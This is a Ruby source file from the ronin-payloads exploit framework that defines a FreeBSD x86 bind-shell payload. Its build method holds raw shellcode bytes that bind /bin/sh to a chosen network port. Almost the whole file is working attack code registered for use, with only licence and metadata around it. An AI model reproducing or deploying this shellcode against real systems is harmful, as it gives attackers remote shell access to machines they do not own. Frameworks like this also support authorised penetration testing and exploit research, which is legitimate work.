# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/bind_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module FreeBSD
        module X86
          #
          # FreeBSD x86 shellcode that binds a shell to a port.
          #
          class BindShell < BindShellPayload

            register 'shellcode/freebsd/x86/bind_shell'

            arch :x86
            os :freebsd

            author 'zillion', email: 'zillion@safemode.org'

            summary 'FreeBSD x86 bind shell shellcode'
            description <<~DESC
              FreeBSD x86 shellcode that binds a shell to a port.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-164.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\xeb\x64\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0" \
                         "\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x09\x02\x66\xc7\x46" \
                         "\x0a#{packed_port}\x89\x46\x0c\x6a\x10\x8d\x46\x08\x50\x52\x31\xc0" \
                         "\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31\xc0\xb0\x6a\x50\xcd\x80" \
                         "\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd\x80\xb1\x03\xbb\xff\xff" \
                         "\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01" \
                         "\x75\xf3\x31\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\x97\xff" \
                         "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23".b
            end

          end
        end
      end
    end
  end
end
